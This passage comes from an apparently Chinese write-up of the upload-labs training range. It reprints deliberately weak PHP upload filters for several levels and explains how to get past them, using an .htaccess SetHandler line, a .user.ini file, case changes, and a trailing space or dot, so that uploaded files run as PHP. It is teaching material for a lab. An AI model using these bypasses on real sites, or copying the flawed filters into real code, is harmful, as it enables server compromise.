class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码分析</span></span><br><span class="line"><span class="comment">//与Pass-03差不多，只是过滤了更多的后缀名</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>发现没有过滤 <code>.htaccess</code> 文件，可以上传 <code>.htaccess</code> +图片码来进行绕过利用。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//.htaccess文件内容</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="comment">//把请求文件当成php解析</span></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629151039161.png"
                      class="" title="image-20230629151039161"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629150701236.png"
                      class="" title="image-20230629150701236"
                >

<p>访问上传的文件：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629151137500.png"
                      class="" title="image-20230629151137500"
                >

<h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//好吧，这题把能大部分都过滤了</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>自php 5.3.0起，除了主php.ini之外，PHP还会在每个目录下扫描INI文件，即.user.ini文件。</p>
<p>可以利用.user.ini文件来绕过利用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629152552329.png"
                      class="" title="image-20230629152552329"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629152653206.png"
                      class="" title="image-20230629152653206"
                >

<p>访问目录中已存在的可执行的php文件：</p>
<h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//.htaccess和.user.ini也都过滤了</span></span><br><span class="line"><span class="comment">//过滤不完全，可以利用大小写绕过</span></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629161431204.png"
                      class="" title="image-20230629161431204"
                >

<p>访问上传后的php文件：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629161512435.png"
                      class="" title="image-20230629161512435"
                >

<h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大小写绕过也不行了</span></span><br><span class="line"><span class="comment">//但是没有过滤空格</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>在拓展名后加一个空格绕过</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629161750208.png"
                      class="" title="image-20230629161750208"
                >

<h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把可以解析的拓展名都过滤了</span></span><br><span class="line"><span class="comment">//但没有去除拓展名后的点</span></span><br><span class="line"><span class="comment">//思路：利用windows特性，在拓展名后加个点（windows命名文件时不能出现点）</span></span><br></pre></td></tr></table></figure></div>

<h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span 